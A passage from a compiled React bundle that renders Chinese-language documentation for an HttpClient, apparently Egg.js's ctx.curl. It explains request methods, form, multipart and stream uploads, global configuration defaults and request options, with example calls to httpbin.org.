\u4f1a\u8bbe\u7f6e\u4e3a ",r.a.createElement("code",null,"GET"),"\u3002"),r.a.createElement("li",null,"\u8fd4\u56de\u503c ",r.a.createElement("code",null,"result")," \u4f1a\u5305\u542b 3 \u4e2a\u5c5e\u6027\uff1a",r.a.createElement("code",null,"status"),", ",r.a.createElement("code",null,"headers")," \u548c ",r.a.createElement("code",null,"data"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"status"),": \u54cd\u5e94\u72b6\u6001\u7801\uff0c\u5982 ",r.a.createElement("code",null,"200"),", ",r.a.createElement("code",null,"302"),", ",r.a.createElement("code",null,"404"),", ",r.a.createElement("code",null,"500")," \u7b49\u7b49"),r.a.createElement("li",null,r.a.createElement("code",null,"headers"),": \u54cd\u5e94\u5934\uff0c\u7c7b\u4f3c ",r.a.createElement("code",null,"{"," 'content-type': 'text/html', ... ","}")),r.a.createElement("li",null,r.a.createElement("code",null,"data"),": \u54cd\u5e94 body\uff0c\u9ed8\u8ba4 HttpClient \u4e0d\u4f1a\u505a\u4efb\u4f55\u5904\u7406\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de Buffer \u7c7b\u578b\u6570\u636e\u3002 \u4e00\u65e6\u8bbe\u7f6e\u4e86 ",r.a.createElement("code",null,"options.dataType"),"\uff0cHttpClient \u5c06\u4f1a\u6839\u636e\u6b64\u53c2\u6570\u5bf9 ",r.a.createElement("code",null,"data")," \u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002")))),r.a.createElement("p",null,"\u5b8c\u6574\u7684\u8bf7\u6c42\u53c2\u6570 ",r.a.createElement("code",null,"options")," \u548c\u8fd4\u56de\u503c ",r.a.createElement("code",null,"result")," \u7684\u8bf4\u660e\u8bf7\u770b\u4e0b\u6587\u7684 ",r.a.createElement(l["AnchorLink"],{to:"#options-%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"},"options \u53c2\u6570\u8be6\u89e3")," \u7ae0\u8282\u3002"),r.a.createElement("h3",{id:"post"},r.a.createElement(l["AnchorLink"],{to:"#post","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"POST"),r.a.createElement("p",null,"\u521b\u5efa\u6570\u636e\u7684\u573a\u666f\u4e00\u822c\u6765\u8bf4\u90fd\u4f1a\u4f7f\u7528 POST \u8bf7\u6c42\uff0c\u5b83\u76f8\u5bf9\u4e8e GET \u6765\u8bf4\u591a\u4e86\u8bf7\u6c42 body \u8fd9\u4e2a\u53c2\u6570\u3002"),r.a.createElement("p",null,"\u4ee5\u53d1\u9001 JSON body \u7684\u573a\u666f\u4e3e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async post() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/post', {\n      // \u5fc5\u987b\u6307\u5b9a method\n      method: 'POST',\n      // \u901a\u8fc7 contentType \u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u53d1\u9001\n      contentType: 'json',\n      data: {\n        hello: 'world',\n        now: Date.now(),\n      },\n      // \u660e\u786e\u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u5904\u7406\u8fd4\u56de\u7684\u54cd\u5e94 body\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u4e0b\u6587\u8fd8\u4f1a\u8be6\u7ec6\u8bb2\u89e3\u4ee5 POST \u5b9e\u73b0 Form \u8868\u5355\u63d0\u4ea4\u548c\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002"),r.a.createElement("h3",{id:"put"},r.a.createElement(l["AnchorLink"],{to:"#put","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"PUT"),r.a.createElement("p",null,"PUT \u4e0e POST \u7c7b\u4f3c\uff0c\u5b83\u66f4\u52a0\u9002\u5408\u66f4\u65b0\u6570\u636e\u548c\u66ff\u6362\u6570\u636e\u7684\u8bed\u4e49\u3002 \u9664\u4e86 method \u53c2\u6570\u9700\u8981\u8bbe\u7f6e\u4e3a ",r.a.createElement("code",null,"PUT"),"\uff0c\u5176\u4ed6\u53c2\u6570\u51e0\u4e4e\u8ddf POST \u4e00\u6a21\u4e00\u6837\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async put() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/put', {\n      // \u5fc5\u987b\u6307\u5b9a method\n      method: 'PUT',\n      // \u901a\u8fc7 contentType \u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u53d1\u9001\n      contentType: 'json',\n      data: {\n        update: 'foo bar',\n      },\n      // \u660e\u786e\u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u5904\u7406\u54cd\u5e94 body\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"delete"},r.a.createElement(l["AnchorLink"],{to:"#delete","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"DELETE"),r.a.createElement("p",null,"\u5220\u9664\u6570\u636e\u4f1a\u9009\u62e9 DELETE \u8bf7\u6c42\uff0c\u5b83\u901a\u5e38\u53ef\u4ee5\u4e0d\u9700\u8981\u52a0\u8bf7\u6c42 body\uff0c\u4f46\u662f HttpClient \u4e0d\u4f1a\u9650\u5236\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async del() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/delete', {\n      // \u5fc5\u987b\u6307\u5b9a method\n      method: 'DELETE',\n      // \u660e\u786e\u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u5904\u7406\u54cd\u5e94 body\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u9ad8\u7ea7-http-\u8bf7\u6c42"},r.a.createElement(l["AnchorLink"],{to:"#\u9ad8\u7ea7-http-\u8bf7\u6c42","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9ad8\u7ea7 HTTP \u8bf7\u6c42"),r.a.createElement("p",null,"\u5728\u771f\u5b9e\u7684\u5e94\u7528\u573a\u666f\u4e0b\uff0c\u8fd8\u662f\u4f1a\u5305\u542b\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684 HTTP \u8bf7\u6c42\u3002"),r.a.createElement("h3",{id:"form-\u8868\u5355\u63d0\u4ea4"},r.a.createElement(l["AnchorLink"],{to:"#form-\u8868\u5355\u63d0\u4ea4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Form \u8868\u5355\u63d0\u4ea4"),r.a.createElement("p",null,"\u9762\u5411\u6d4f\u89c8\u5668\u8bbe\u8ba1\u7684 Form \u8868\u5355\uff08\u4e0d\u5305\u542b\u6587\u4ef6\uff09\u63d0\u4ea4\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u8981\u6c42\u4ee5 ",r.a.createElement("code",null,"content-type: application/x-www-form-urlencoded"),"\u7684\u683c\u5f0f\u63d0\u4ea4\u8bf7\u6c42\u6570\u636e\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async submit() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/post', {\n      // \u5fc5\u987b\u6307\u5b9a method\uff0c\u652f\u6301 POST\uff0cPUT \u548c DELETE\n      method: 'POST',\n      // \u4e0d\u9700\u8981\u8bbe\u7f6e contentType\uff0cHttpClient \u4f1a\u9ed8\u8ba4\u4ee5 application/x-www-form-urlencoded \u683c\u5f0f\u53d1\u9001\u8bf7\u6c42\n      data: {\n        now: Date.now(),\n        foo: 'bar',\n      },\n      // \u660e\u786e\u544a\u8bc9 HttpClient \u4ee5 JSON \u683c\u5f0f\u5904\u7406\u54cd\u5e94 body\n      dataType: 'json',\n    });\n    ctx.body = result.data.form;\n    // \u54cd\u5e94\u6700\u7ec8\u4f1a\u662f\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u7ed3\u679c\uff1a\n    // {\n    //   \"foo\": \"bar\",\n    //   \"now\": \"1483864184348\"\n    // }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"\u4ee5-multipart-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4ee5-multipart-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ee5 Multipart \u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"),r.a.createElement("p",null,"\u5f53\u4e00\u4e2a Form \u8868\u5355\u63d0\u4ea4\u5305\u542b\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u8bf7\u6c42\u6570\u636e\u683c\u5f0f\u5c31\u5fc5\u987b\u4ee5 ",r.a.createElement(l["Link"],{to:"http://tools.ietf.org/html/rfc2388"},"multipart/form-data"),"\u8fdb\u884c\u63d0\u4ea4\u4e86\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/node-modules/urllib"},"urllib")," \u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/formstream"},"formstream")," \u6a21\u5757\u6765\u5e2e\u52a9\u6211\u4eec\u751f\u6210\u53ef\u4ee5\u88ab\u6d88\u8d39\u7684 ",r.a.createElement("code",null,"form")," \u5bf9\u8c61\u3002"),r.a.createElement(o["a"],{code:"// app/controller/http.js\nclass HttpController extends Controller {\n  async upload() {\n    const { ctx } = this;\n\n    const result = await ctx.curl('https://httpbin.org/post', {\n      method: 'POST',\n      dataType: 'json',\n      data: {\n        foo: 'bar',\n      },\n\n      // \u5355\u6587\u4ef6\u4e0a\u4f20\n      files: __filename,\n\n      // \u591a\u6587\u4ef6\u4e0a\u4f20\n      // files: {\n      //   file1: __filename,\n      //   file2: fs.createReadStream(__filename),\n      //   file3: Buffer.from('mock file content'),\n      // },\n    });\n\n    ctx.body = result.data.files;\n    // \u54cd\u5e94\u6700\u7ec8\u4f1a\u662f\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u7ed3\u679c\uff1a\n    // {\n    //   \"file\": \"'use strict';\\n\\nconst For....\"\n    // }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"\u4ee5-stream-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4ee5-stream-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ee5 Stream \u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"),r.a.createElement("p",null,"\u5176\u5b9e\uff0c\u5728 Node.js \u7684\u4e16\u754c\u91cc\u9762\uff0cStream \u624d\u662f\u4e3b\u6d41\u3002 \u5982\u679c\u670d\u52a1\u7aef\u652f\u6301\u6d41\u5f0f\u4e0a\u4f20\uff0c\u6700\u53cb\u597d\u7684\u65b9\u5f0f\u8fd8\u662f\u76f4\u63a5\u53d1\u9001 Stream\u3002 Stream \u5b9e\u9645\u4f1a\u4ee5 ",r.a.createElement("code",null,"Transfer-Encoding: chunked")," \u4f20\u8f93\u7f16\u7801\u683c\u5f0f\u53d1\u9001\uff0c\u8fd9\u4e2a\u8f6c\u6362\u662f ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html"},"HTTP")," \u6a21\u5757\u81ea\u52a8\u5b9e\u73b0\u7684\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nconst fs = require('fs');\nconst FormStream = require('formstream');\nclass NpmController extends Controller {\n  async uploadByStream() {\n    const ctx = this.ctx;\n    // \u4e0a\u4f20\u5f53\u524d\u6587\u4ef6\u672c\u8eab\u7528\u4e8e\u6d4b\u8bd5\n    const fileStream = fs.createReadStream(__filename);\n    // httpbin.org \u4e0d\u652f\u6301 stream \u6a21\u5f0f\uff0c\u4f7f\u7528\u672c\u5730 stream \u63a5\u53e3\u4ee3\u66ff\n    const url = `${ctx.protocol}://${ctx.host}/stream`;\n    const result = await ctx.curl(url, {\n      // \u5fc5\u987b\u6307\u5b9a method\uff0c\u652f\u6301 POST\uff0cPUT\n      method: 'POST',\n      // \u4ee5 stream \u6a21\u5f0f\u63d0\u4ea4\n      stream: fileStream,\n    });\n    ctx.status = result.status;\n    ctx.set(result.headers);\n    ctx.body = result.data;\n    // \u54cd\u5e94\u6700\u7ec8\u4f1a\u662f\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u7ed3\u679c\uff1a\n    // {\"streamSize\":574}\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"options-\u53c2\u6570\u8be6\u89e3"},r.a.createElement(l["AnchorLink"],{to:"#options-\u53c2\u6570\u8be6\u89e3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"options \u53c2\u6570\u8be6\u89e3"),r.a.createElement("p",null,"\u7531\u4e8e HTTP \u8bf7\u6c42\u7684\u590d\u6742\u6027\uff0c\u5bfc\u81f4 ",r.a.createElement("code",null,"httpclient.request(url, options)")," \u7684 options \u53c2\u6570\u4f1a\u975e\u5e38\u591a\u3002 \u63a5\u4e0b\u6765\u5c06\u4f1a\u4ee5\u53c2\u6570\u8bf4\u660e\u548c\u4ee3\u7801\u914d\u5408\u4e00\u8d77\u8bb2\u89e3\u6bcf\u4e2a\u53ef\u9009\u53c2\u6570\u7684\u5b9e\u9645\u7528\u9014\u3002"),r.a.createElement("h3",{id:"httpclient-\u9ed8\u8ba4\u5168\u5c40\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#httpclient-\u9ed8\u8ba4\u5168\u5c40\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"HttpClient \u9ed8\u8ba4\u5168\u5c40\u914d\u7f6e"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.httpclient = {\n  // \u662f\u5426\u5f00\u542f\u672c\u5730 DNS \u7f13\u5b58\uff0c\u9ed8\u8ba4\u5173\u95ed\uff0c\u5f00\u542f\u540e\u6709\u4e24\u4e2a\u7279\u6027\n  // 1. \u6240\u6709\u7684 DNS \u67e5\u8be2\u90fd\u4f1a\u9ed8\u8ba4\u4f18\u5148\u4f7f\u7528\u7f13\u5b58\u7684\uff0c\u5373\u4f7f DNS \u67e5\u8be2\u9519\u8bef\u4e5f\u4e0d\u5f71\u54cd\u5e94\u7528\n  // 2. \u5bf9\u540c\u4e00\u4e2a\u57df\u540d\uff0c\u5728 dnsCacheLookupInterval \u7684\u95f4\u9694\u5185\uff08\u9ed8\u8ba4 10s\uff09\u53ea\u4f1a\u67e5\u8be2\u4e00\u6b21\n  enableDNSCache: false,\n  // \u5bf9\u540c\u4e00\u4e2a\u57df\u540d\u8fdb\u884c DNS \u67e5\u8be2\u7684\u6700\u5c0f\u95f4\u9694\u65f6\u95f4\n  dnsCacheLookupInterval: 10000,\n  // DNS \u540c\u65f6\u7f13\u5b58\u7684\u6700\u5927\u57df\u540d\u6570\u91cf\uff0c\u9ed8\u8ba4 1000\n  dnsCacheMaxLength: 1000,\n\n  request: {\n    // \u9ed8\u8ba4 request \u8d85\u65f6\u65f6\u95f4\n    timeout: 3000,\n  },\n\n  httpAgent: {\n    // \u9ed8\u8ba4\u5f00\u542f http KeepAlive \u529f\u80fd\n    keepAlive: true,\n    // \u7a7a\u95f2\u7684 KeepAlive socket \u6700\u957f\u53ef\u4ee5\u5b58\u6d3b 4 \u79d2\n    freeSocketTimeout: 4000,\n    // \u5f53 socket \u8d85\u8fc7 30 \u79d2\u90fd\u6ca1\u6709\u4efb\u4f55\u6d3b\u52a8\uff0c\u5c31\u4f1a\u88ab\u5f53\u4f5c\u8d85\u65f6\u5904\u7406\u6389\n    timeout: 30000,\n    // \u5141\u8bb8\u521b\u5efa\u7684\u6700\u5927 socket \u6570\n    maxSockets: Number.MAX_SAFE_INTEGER,\n    // \u6700\u5927\u7a7a\u95f2 socket \u6570\n    maxFreeSockets: 256,\n  },\n\n  httpsAgent: {\n    // \u9ed8\u8ba4\u5f00\u542f https KeepAlive \u529f\u80fd\n    keepAlive: true,\n    // \u7a7a\u95f2\u7684 KeepAlive socket \u6700\u957f\u53ef\u4ee5\u5b58\u6d3b 4 \u79d2\n    freeSocketTimeout: 4000,\n    // \u5f53 socket \u8d85\u8fc7 30 \u79d2\u90fd\u6ca1\u6709\u4efb\u4f55\u6d3b\u52a8\uff0c\u5c31\u4f1a\u88ab\u5f53\u4f5c\u8d85\u65f6\u5904\u7406\u6389\n    timeout: 30000,\n    // \u5141\u8bb8\u521b\u5efa\u7684\u6700\u5927 socket \u6570\n    maxSockets: Number.MAX_SAFE_INTEGER,\n    // \u6700\u5927\u7a7a\u95f2 socket \u6570\n    maxFreeSockets: 256,\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5e94\u7528\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config/config.default.js")," \u8986\u76d6\u6b64\u914d\u7f6e\u3002"),r.a.createElement("h3",{id:"data-object"},r.a.createElement(l["AnchorLink"],{to:"#data-object","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"data: Object")),r.a.createElement("p",null,"\u9700\u8981\u53d1\u9001\u7684\u8bf7\u6c42\u6570\u636e\uff0c\u6839\u636e ",r.a.createElement("code",null,"method")," \u81ea\u52a8\u9009\u62e9\u6b63\u786e\u7684\u6570\u636e\u5904\u7406\u65b9\u5f0f\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"GET\uff0cHEAD\uff1a\u901a\u8fc7 ",r.a.createElement("code",null,"querystring.stringify(data)")," \u5904\u7406\u540e\u62fc\u63a5\u5230 url \u7684 query \u53c2\u6570\u4e0a\u3002"),r.a.createElement("li",null,"POST\uff0cPUT \u548c DELETE \u7b49\uff1a\u9700\u8981\u6839\u636e ",r.a.createElement("code",null,"contentType")," \u505a\u8fdb\u4e00\u6b65\u5224\u65ad\u5904\u7406\u3002",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"contentType = json"),"\uff1a\u901a\u8fc7 ",r.a.createElement("code",null,"JSON.stringify(data)")," \u5904\u7406\uff0c\u5e76\u8bbe\u7f6e\u4e3a body \u53d1\u9001\u3002"),r.a.createElement("li",null,"\u5176\u4ed6\uff1a\u901a\u8fc7 ",r.a.createElement("code",null,"querystring.stringify(data)")," \u5904\u7406\uff0c\u5e76\u8bbe\u7f6e\u4e3a body \u53d1\u9001\u3002")))),r.a.createElement(o["a"],{code:"// GET + data\nctx.curl(url, {\n  data: { foo: 'bar' },\n});\n\n// POST + data\nctx.curl(url, {\n  method: 'POST',\n  data: { foo: 'bar' },\n});\n\n// POST + JSON + data\nctx.curl(url, {\n  method: 'POST',\n  contentType: 'json',\n  data: { foo: 'bar' },\n});",lang:"js"}),r.a.createElement("h3",{id:"dataasquerystring-boolean"},r.a.createElement(l["AnchorLink"],{to:"#dataasquerystring-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"dataAsQueryString: Boolean")),r.a.createElement("p",null,"\u5982\u679c\u8bbe\u7f6e\u4e86 ",r.a.createElement("code",null,"dataAsQueryString=true"),"\uff0c\u90a3\u4e48\u5373\u4f7f\u5728 POST \u60c5\u51b5\u4e0b\uff0c \u4e5f\u4f1a\u5f3a\u5236\u5c06 ",r.a.createElement("code",null,"options.data")," \u4ee5 ",r.a.createElement("code",null,"querystring.stringify")," \u5904\u7406\u4e4b\u540e\u62fc\u63a5\u5230 ",r.a.createElement("code",null,"url")," \u7684 query \u53c2\u6570\u4e0a\u3002"),r.a.createElement("p",null,"\u53ef\u4ee5\u5f88\u597d\u5730\u89e3\u51b3\u4ee5 ",r.a.createElement("code",null,"stream")," \u53d1\u9001\u6570\u636e\uff0c\u4e14\u989d\u5916\u7684\u8bf7\u6c42\u53c2\u6570\u4ee5 ",r.a.createElement("code",null,"url")," query \u5f62\u5f0f\u4f20\u9012\u7684\u5e94\u7528\u573a\u666f\uff1a"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  dataAsQueryString: true,\n  data: {\n    // \u4e00\u822c\u6765\u8bf4\u90fd\u662f access token \u4e4b\u7c7b\u7684\u6743\u9650\u9a8c\u8bc1\u53c2\u6570\n    accessToken: 'some access token value',\n  },\n  stream: myFileStream,\n});",lang:"js"}),r.a.createElement("h3",{id:"content-stringbuffer"},r.a.createElement(l["AnchorLink"],{to:"#content-stringbuffer","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"content: String|Buffer")),r.a.createElement("p",null,"\u53d1\u9001\u8bf7\u6c42\u6b63\u6587\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u6b64\u53c2\u6570\uff0c\u90a3\u4e48\u4f1a\u76f4\u63a5\u5ffd\u7565 ",r.a.createElement("code",null,"data")," \u53c2\u6570\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  // \u76f4\u63a5\u53d1\u9001\u539f\u59cb xml \u6570\u636e\uff0c\u4e0d\u9700\u8981 HttpClient \u505a\u7279\u6b8a\u5904\u7406\n  content: '<xml><hello>world</hello></xml>',\n  headers: {\n    'content-type': 'text/html',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"files-mixed"},r.a.createElement(l["AnchorLink"],{to:"#files-mixed","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"files: Mixed")),r.a.createElement("p",null,"\u6587\u4ef6\u4e0a\u4f20\uff0c\u652f\u6301\u683c\u5f0f\uff1a ",r.a.createElement("code",null,"String | ReadStream | Buffer | Array | Object"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  files: '/path/to/read',\n  data: {\n    foo: 'other fields',\n  },\n});",lang:"js"}),r.a.createElement("p",null,"\u591a\u6587\u4ef6\u4e0a\u4f20\uff1a"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  files: {\n    file1: '/path/to/read',\n    file2: fs.createReadStream(__filename),\n    file3: Buffer.from('mock file content'),\n  },\n  data: {\n    foo: 'other fields',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"stream-readstream"},r.a.createElement(l["AnchorLink"],{to:"#stream-readstream","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"stream: ReadStream")),r.a.createElement("p",null,"\u8bbe\u7f6e\u53d1\u9001\u8bf7\u6c42\u6b63\u6587\u7684\u53ef\u8bfb\u6570\u636e\u6d41\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"null"),"\u3002 \u4e00\u65e6\u8bbe\u7f6e\u4e86\u6b64\u53c2\u6570\uff0cHttpClient \u5c06\u4f1a\u5ffd\u7565 ",r.a.createElement("code",null,"data")," \u548c ",r.a.createElement("code",null,"content"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  stream: fs.createReadStream('/path/to/read'),\n});",lang:"js"}),r.a.createElement("h3",{id:"writestream-writestream"},r.a.createElement(l["AnchorLink"],{to:"#writestream-writestream","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"writeStream: WriteStream")),r.a.createElement("p",null,"\u8bbe\u7f6e\u63a5\u53d7\u54cd\u5e94\u6570\u636e\u7684\u53ef\u5199\u6570\u636e\u6d41\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"null"),"\u3002 \u4e00\u65e6\u8bbe\u7f6e\u6b64\u53c2\u6570\uff0c\u90a3\u4e48\u8fd4\u56de\u503c ",r.a.createElement("code",null,"result.data")," \u5c06\u4f1a\u88ab\u8bbe\u7f6e\u4e3a ",r.a.createElement("code",null,"null"),"\uff0c \u56e0\u4e3a\u6570\u636e\u5df2\u7ecf\u5168\u90e8\u5199\u5165\u5230 ",r.a.createElement("code",null,"writeStream")," \u4e2d\u4e86\u3002"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  writeStream: fs.createWriteStream('/path/to/store'),\n});",lang:"js"}),r.a.createElement("h3",{id:"consumewritestream-boolean"},r.a.createElement(l["AnchorLink"],{to:"#consumewritestream-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"consumeWriteStream: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u7b49\u5f85 ",r.a.createElement("code",null,"writeStream")," \u5b8c\u5168\u5199\u5b8c\u624d\u7b97\u54cd\u5e94\u5168\u90e8\u63a5\u6536\u5b8c\u6bd5\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"true"),"\u3002 \u6b64\u53c2\u6570\u4e0d\u5efa\u8bae\u4fee\u6539\u9ed8\u8ba4\u503c\uff0c\u9664\u975e\u6211\u4eec\u660e\u786e\u77e5\u9053\u5b83\u7684\u526f\u4f5c\u7528\u662f\u53ef\u63a5\u53d7\u7684\uff0c \u5426\u5219\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4 ",r.a.createElement("code",null,"writeStream")," \u6570\u636e\u4e0d\u5b8c\u6574\u3002"),r.a.createElement("h3",{id:"method-string"},r.a.createElement(l["AnchorLink"],{to:"#method-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"method: String")),r.a.createElement("p",null,"\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u6cd5\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"GET"),"\u3002 \u652f\u6301 ",r.a.createElement("code",null,"GET\u3001POST\u3001PUT\u3001DELETE\u3001PATCH")," \u7b49",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html#http_http_methods"},"\u6240\u6709 HTTP \u65b9\u6cd5"),"\u3002"),r.a.createElement("h3",{id:"contenttype-string"},r.a.createElement(l["AnchorLink"],{to:"#contenttype-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"contentType: String")),r.a.createElement("p",null,"\u8bbe\u7f6e\u8bf7\u6c42\u6570\u636e\u683c\u5f0f\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"undefined"),"\uff0cHttpClient \u4f1a\u81ea\u52a8\u6839\u636e ",r.a.createElement("code",null,"data")," \u548c ",r.a.createElement("code",null,"content")," \u53c2\u6570\u81ea\u52a8\u8bbe\u7f6e\u3002",r.a.createElement("code",null,"data")," \u662f object \u7684\u65f6\u5019\u9ed8\u8ba4\u8bbe\u7f6e\u7684\u662f ",r.a.createElement("code",null,"form"),"\u3002\u652f\u6301 ",r.a.createElement("code",null,"json")," \u683c\u5f0f\u3002"),r.a.createElement("p",null,"\u5982\u9700\u8981\u4ee5 JSON \u683c\u5f0f\u53d1\u9001 ",r.a.createElement("code",null,"data"),"\uff1a"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  data: {\n    foo: 'bar',\n    now: Date.now(),\n  },\n  contentType: 'json',\n});",lang:"js"}),r.a.createElement("h3",{id:"datatype-string"},r.a.createElement(l["AnchorLink"],{to:"#datatype-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"dataType: String")),r.a.createElement("p",null,"\u8bbe\u7f6e\u54cd\u5e94\u6570\u636e\u683c\u5f0f\uff0c\u9ed8\u8ba4\u4e0d\u5bf9\u54cd\u5e94\u6570\u636e\u505a\u4efb\u4f55\u5904\u7406\uff0c\u76f4\u63a5\u8fd4\u56de\u539f\u59cb\u7684 buffer \u683c\u5f0f\u6570\u636e\u3002 \u652f\u6301 ",r.a.createElement("code",null,"text")," \u548c ",r.a.createElement("code",null,"json")," \u4e24\u79cd\u683c\u5f0f\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u8bbe\u7f6e\u6210 ",r.a.createElement("code",null,"json")," \u65f6\uff0c\u5982\u679c\u54cd\u5e94\u6570\u636e\u89e3\u6790\u5931\u8d25\u4f1a\u629b ",r.a.createElement("code",null,"JSONResponseFormatError")," \u5f02\u5e38\u3002")),r.a.createElement(o["a"],{code:"const jsonResult = await ctx.curl(url, {\n  dataType: 'json',\n});\nconsole.log(jsonResult.data);\n\nconst htmlResult = await ctx.curl(url, {\n  dataType: 'text',\n});\nconsole.log(htmlResult.data);",lang:"js"}),r.a.createElement("h3",{id:"fixjsonctlchars-boolean"},r.a.createElement(l["AnchorLink"],{to:"#fixjsonctlchars-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"fixJSONCtlChars: Boolean")),r.a.createElement("p",null,"\u662f\u5426\u81ea\u52a8\u8fc7\u6ee4\u54cd\u5e94\u6570\u636e\u4e2d\u7684\u7279\u6b8a\u63a7\u5236\u5b57\u7b26 (U+0000 ~ U+001F)\uff0c\u9ed8\u8ba4\u662f ",r.a.createElement("code",null,"false"),"\u3002 \u901a\u5e38\u4e00\u4e9b CGI \u7cfb\u7edf\u8fd4\u56de\u7684 JSON 